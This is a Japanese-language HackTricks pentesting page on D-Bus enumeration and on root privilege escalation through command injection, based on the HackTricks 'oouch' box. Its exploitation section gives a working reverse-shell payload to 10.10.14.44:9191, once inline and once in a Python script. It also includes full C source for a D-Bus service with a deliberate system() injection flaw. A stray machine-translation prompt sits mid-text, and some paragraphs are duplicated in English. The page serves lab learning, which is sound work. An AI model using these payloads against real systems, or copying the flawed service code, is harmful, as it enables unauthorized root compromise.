# D-Bus列挙とコマンドインジェクション特権昇格

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## **GUI列挙**

**(この列挙情報は** [**https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/**](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)**から取得されました)**

Ubuntuデスクトップは、D-Busをそのプロセス間通信（IPC）メディエーターとして使用しています。Ubuntuでは、複数のメッセージバスが同時に実行されます。システムバスは、主に**特権のあるサービスがシステム全体に関連するサービスを公開するために使用**され、ログインしている各ユーザーごとに1つのセッションバスがあり、その特定のユーザーに関連するサービスを公開します。特権昇格を試みるため、特権が高い（つまり、root）で実行されることが多いシステムバスに主に焦点を当てます。D-Busアーキテクチャでは、セッションバスごとに1つの「ルーター」が使用され、クライアントメッセージを該当するサービスにリダイレクトします。クライアントは、メッセージを送信したいサービスのアドレスを指定する必要があります。

各サービスは、公開する**オブジェクト**と**インターフェース**によって定義されます。オブジェクトは、標準のOOP言語のクラスのインスタンスと考えることができます。各ユニークなインスタンスは、オブジェクトが公開する各オブジェクトを一意に識別するファイルシステムパスに似た文字列で識別されます。私たちの調査に役立つ標準のインターフェースは、**org.freedesktop.DBus.Introspectable**インターフェースです。これには、オブジェクトがサポートするメソッド、シグナル、およびプロパティのXML表現を返す単一のメソッド、Introspectが含まれています。このブログ投稿では、メソッドに焦点を当て、プロパティとシグナルは無視します。

D-Busインターフェースとの通信には、2つのツールを使用しました。スクリプトでD-Busが公開するメソッドを簡単に呼び出すことができるCLIツールである**gdbus**と、利用可能なサービスを列挙し、各サービスが含むオブジェクトを表示するためのPythonベースのGUIツールである[**D-Feet**](https://wiki.gnome.org/Apps/DFeet)です。
```bash
sudo apt-get install d-feet
```
![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

_図1. D-Feetメインウィンドウ_

![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

_図2. D-Feetインターフェースウィンドウ_

図1の左側のペインには、D-Busデーモンシステムバスに登録されたさまざまなサービスが表示されます（上部のSystem Busボタンに注意してください）。私は**org.debin.apt**サービスを選択し、D-Feetは自動的に**利用可能なオブジェクトのサービスにクエリを送信**しました。特定のオブジェクトを選択すると、図2に示すように、すべてのインターフェースとそれぞれのメソッド、プロパティ、シグナルがリストされます。また、各**IPC公開メソッドのシグネチャ**も取得できます。

また、各サービスをホストするプロセスの**PID**と**コマンドライン**も表示されます。これは非常に便利な機能であり、調査対象のサービスが実際に高い特権で実行されていることを検証できます。システムバス上の一部のサービスはrootとして実行されないため、研究対象としてはあまり興味深くありません。

D-Feetでは、さまざまなメソッドを呼び出すこともできます。メソッドの入力画面では、呼び出される関数のパラメータとして解釈されるPython式のリストをカンマで区切って指定できます（図3参照）。Pythonの型はD-Busの型にマーシャリングされ、サービスに渡されます。

![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-23.png)

_図3. D-Feetを介したD-Busメソッドの呼び出し_

一部のメソッドは、呼び出し前に認証が必要です。私たちの目標は、まずは資格情報なしで特権を昇格させることなので、これらのメソッドは無視します。

![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-24.png)

_図4. 認証が必要なメソッド_

また、一部のサービスは、ユーザーが特定のアクションを実行することが許可されるかどうかを判断するために、org.freedeskto.PolicyKit1という別のD-Busサービスにクエリを送信します。

## **コマンドラインの列挙**

### サービスオブジェクトのリスト

次のコマンドを使用して、開かれたD-Busインターフェースをリストアップすることができます：
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### 接続

プロセスがバスに接続を設定すると、バスはその接続に対して _ユニークな接続名_ と呼ばれる特別なバス名を割り当てます。このタイプのバス名は不変です - 接続が存在する限り変更されないことが保証されており、さらに重要なことに、バスの寿命中に再利用されることはありません。つまり、同じプロセスがバスへの接続を閉じて新しい接続を作成しても、他の接続にはそのようなユニークな接続名が割り当てられることはありません。ユニークな接続名は、それ以外は禁止されているコロン文字で始まるため、簡単に認識できます。

### サービスオブジェクト情報

次に、次のコマンドでインターフェースに関する情報を取得できます：
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### サービスオブジェクトのインターフェースのリスト

十分な権限を持っている必要があります。
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### サービスオブジェクトのIntrospectインターフェース

この例では、`tree`パラメータを使用して最新のインターフェースが選択されました（_前のセクションを参照_）。
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
### モニター/キャプチャーインターフェース

十分な特権を持っている場合（`send_destination`と`receive_sender`の特権だけでは不十分です）、D-Busの通信を**モニター**することができます。

通信を**モニター**するには、**root**である必要があります。rootであっても問題が発生する場合は、[https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/)と[https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)を確認してください。

{% hint style="warning" %}
D-Busの設定ファイルを構成して、**非rootユーザーが通信をスニッフできるようにする方法**を知っている場合は、**お問い合わせください**！
{% endhint %}

モニターするための異なる方法：
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
以下の例では、インターフェース `htb.oouch.Block` が監視され、**誤った通信経路でメッセージ "**_**lalalalal**_**" が送信されます**。
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
`monitor`の代わりに`capture`を使用して、結果をpcapファイルに保存することができます。

#### ノイズをフィルタリングする <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

バス上の情報があまりにも多い場合は、次のようにマッチルールを渡します：
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
複数のルールを指定することができます。メッセージがいずれかのルールに一致する場合、そのメッセージは表示されます。以下のようになります:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
詳細なマッチルールの構文については、[D-Busのドキュメント](http://dbus.freedesktop.org/doc/dbus-specification.html)を参照してください。

### その他

`busctl`にはさらに多くのオプションがあります。[**こちらで全てを見つけることができます**](https://www.freedesktop.org/software/systemd/man/busctl.html)。

## **脆弱なシナリオ**

HTBのホスト「oouch」内のユーザー**qtc**として、_**/etc/dbus-1/system.d/htb.oouch.Block.conf**_という予期しないD-Busの設定ファイルが見つかります。
```markup
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
前の設定からわかるように、このD-BUS通信を介して情報を送受信するには、ユーザー`root`または`www-data`である必要があります。

Dockerコンテナ**aeb4525789d8**内のユーザー**qtc**として、ファイル_/code/oouch/routes.py_にいくつかのD-BUS関連のコードがあることがわかります。以下が興味深いコードです：
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
以下は、D-Bus列挙およびコマンドインジェクション特権昇格に関するファイル/hive/hacktricks/linux-hardening/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation.mdからのコンテンツです。関連する英文を日本語に翻訳し、翻訳を返し、マークダウンおよびHTMLの構文を正確に保ちます。コード、ハッキング技術の名前、ハッキング用語、クラウド/SaaSプラットフォームの名前（Workspace、aws、gcpなど）、"leak"という単語、ペンテスト、およびマークダウンタグなどのものは翻訳しないでください。また、翻訳とマークダウン構文以外の追加の要素は追加しないでください。

---
如何に示されているように、これは**D-Busインターフェースに接続**し、"Block"関数に"client\_ip"を送信しています。

D-Bus接続のもう一方には、いくつかのCでコンパイルされたバイナリが実行されています。このコードは、D-Bus接続でIPアドレスを**リッスン**し、`system`関数を介してiptablesを呼び出して指定されたIPアドレスをブロックします。\
**`system`への呼び出しは意図的にコマンドインジェクションの脆弱性があります**ので、次のようなペイロードを使用するとリバースシェルが作成されます：`;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### 悪用する

このページの最後には、D-Busアプリケーションの**完全なCコード**があります。その中には、行91-97の間に**`D-Busオブジェクトパス`**と**`インターフェース名`**が**登録**されている方法が記載されています。この情報は、D-Bus接続に情報を送信するために必要になります。
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
また、57行目では、このD-Bus通信に登録されている**唯一のメソッド**が`Block`と呼ばれていることがわかります（_**そのため、次のセクションではペイロードが`htb.oouch.Block`というサービスオブジェクト、`/htb/oouch/Block`というインターフェース、および`Block`というメソッド名に送信されることになります**_）:
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

以下のPythonコードは、D-Bus接続にペイロードを送信し、`block_iface.Block(runme)`を介して`Block`メソッドに送信します（_前のコードの一部から抽出されたものであることに注意してください_）:
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctlとdbus-send

`busctl` and `dbus-send` are command-line tools used for interacting with the D-Bus system. D-Bus is a message bus system that allows communication between different processes on the same machine or even across different machines on a network.

`busctl`はD-Busシステムとのやり取りに使用されるコマンドラインツールです。D-Busは、同じマシン上の異なるプロセス間やネットワーク上の異なるマシン間での通信を可能にするメッセージバスシステムです。

`dbus-send` is another command-line tool that can be used to send messages to the D-Bus system. It allows you to specify the destination, interface, and method of the message you want to send.

`dbus-send`は、D-Busシステムにメッセージを送信するために使用される別のコマンドラインツールです。送信したいメッセージの宛先、インターフェース、およびメソッドを指定することができます。
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send`は、「メッセージバス」にメッセージを送信するためのツールです。
* メッセージバスは、システム間の通信を容易にするためにシステムで使用されるソフトウェアです。メッセージキューに関連していますが、メッセージバスではメッセージが購読モデルで送信され、非常に迅速です。
* 「-system」タグは、セッションメッセージではなくシステムメッセージであることを示すために使用されます（デフォルトでは）。
* 「--print-reply」タグは、メッセージを適切に表示し、人間が読める形式で応答を受け取るために使用されます。
* 「--dest=Dbus-Interface-Block」は、Dbusインターフェースのアドレスです。
* 「--string:」は、インターフェースに送信するメッセージのタイプです。メッセージを送信するためのいくつかの形式があります（double、bytes、booleans、int、objpath）。その中で、「オブジェクトパス」は、ファイルのパスをDbusインターフェースに送信したい場合に便利です。この場合、特殊なファイル（FIFO）を使用して、ファイルの名前でインターフェースにコマンドを渡すことができます。「string:;」は、再びオブジェクトパスを呼び出すためのもので、FIFOリバースシェルファイル/コマンドの場所を置きます。

_なお、`htb.oouch.Block.Block`では、最初の部分（`htb.oouch.Block`）はサービスオブジェクトを参照し、最後の部分（`.Block`）はメソッド名を参照しています。_

### Cコード

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* あなたは**サイバーセキュリティ会社**で働いていますか？ HackTricksであなたの**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
